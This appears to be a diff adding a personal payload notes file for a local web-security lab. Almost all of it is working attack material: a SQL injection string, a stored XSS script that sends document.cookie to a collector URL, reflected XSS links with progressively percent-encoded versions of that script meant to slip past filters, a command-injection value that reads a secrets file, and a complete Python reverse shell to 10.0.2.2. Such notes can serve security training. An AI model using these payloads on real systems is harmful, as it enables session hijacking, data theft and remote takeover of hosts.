@@ -1,0 +1,25 @@
+alice@alice.com';--
+
+api calls
+http://127.0.0.1:5000/news?text=texthere
+
+
+
+alice innocent comment</li><script>var url = 'http://127.0.0.1:5000/news?text=this+is+my+cookie+->+'+document.cookie;var oReq = new XMLHttpRequest();oReq.open("GET", url);oReq.send()</script>
+
+
+click this innocent <a href="/search?term=%3Cscript%3Evar+url+%3D+%27http%3A%2F%2F127.0.0.1%3A5000%2Fnews%3Ftext%3Dthis%2Bis%2Bmy%2Bcookie%2B-%3E%2B%27%2Bdocument.cookie%3Bvar+oReq+%3D+new+XMLHttpRequest%28%29%3BoReq.open%28%22GET%22%2C+url%29%3BoReq.send%28%29%3C%2Fscript%3E">link</a>
+
+click this innocent <a href="/search?term=%3C%73%63r%69p%74%3Evar+url+%3D+%27http%3A%2F%2F127.0.0.1%3A5000%2Fnews%3Ftext%3Dthis%2Bis%2Bmy%2Bcookie%2B-%3E%2B%27%2Bdocument.cookie%3Bvar+oReq+%3D+new+XMLHttpRequest%28%29%3BoReq.open%28%22GET%22%2C+url%29%3BoReq.send%28%29%3C%2Fscript%3E">link</a>
+
+# url encoded full
+# http://2tap.com/javascript-percent-encoder/
+click this innocent <a href="/search?term=
+%3c%73%63%72%69%70%74%3e%76%61%72%20%75%72%6c%20%3d%20%27%68%74%74%70%3a%2f%2f%31%32%37%2e%30%2e%30%2e%31%3a%35%30%30%30%2f%6e%65%77%73%3f%74%65%78%74%3d%74%68%69%73%2b%69%73%2b%6d%79%2b%63%6f%6f%6b%69%65%2b%2d%3e%2b%27%2b%64%6f%63%75%6d%65%6e%74%2e%63%6f%6f%6b%69%65%3b%76%61%72%20%6f%52%65%71%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%6f%52%65%71%2e%6f%70%65%6e%28%22%47%45%54%22%2c%20%75%72%6c%29%3b%6f%52%65%71%2e%73%65%6e%64%28%29%3c%2f%73%63%72%69%70%74%3e
+">link</a>
+
+# cant bypass Chrome filter
+# isit only 1st order xss xml? useful for xss 
+
+google.com && cat secrets
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.2.2",50001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
